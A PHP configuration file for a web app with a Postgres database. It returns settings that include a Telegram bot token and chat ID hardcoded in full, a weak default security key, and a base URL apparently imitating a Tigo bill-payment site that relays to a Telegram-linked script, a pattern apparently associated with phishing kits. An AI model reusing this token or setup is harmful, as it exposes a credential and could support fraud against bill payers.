<?php
// Parse DATABASE_URL if present (Render default)
$db_host = 'localhost';
$db_user = 'root';
$db_pass = '';
$db_name = 'aire';
$db_port = '5432';

if (getenv('DATABASE_URL')) {
    $url = parse_url(getenv('DATABASE_URL'));
    $db_host = $url['host'] ?? null;
    $db_user = $url['user'] ?? null;
    $db_pass = $url['pass'] ?? null;
    $db_name = ltrim($url['path'] ?? '', '/');
    $db_port = $url['port'] ?? 5432;
    // Neon require SSL
    putenv("PGSSLMODE=require");
}
else {
    // Fallback to individual env vars or local defaults
    $db_host = getenv('DB_HOST') ?: 'localhost';
    $db_user = getenv('DB_USER') ?: 'root';
    $db_pass = getenv('DB_PASS') ?: '';
    $db_name = getenv('DB_NAME') ?: 'aire';
    $db_port = getenv('DB_PORT') ?: '5432';
}

return [
    'botToken' => getenv('BOT_TOKEN') ?: '8310315205:AAEDfY0nwuSeC_G6l2hXzbRY2xzvAHNJYvQ',
    'chatId' => getenv('CHAT_ID') ?: '-5187261721',
    'db_host' => $db_host,
    'db_user' => $db_user,
    'db_pass' => $db_pass,
    'db_name' => $db_name,
    'db_port' => $db_port,
    'baseUrl' => getenv('BASE_URL') ?: 'https://pagatufacturatigo.vercel.app/updatetele.php',
    'security_key' => getenv('SECURITY_KEY') ?: 'secure_key_123'
];
?>
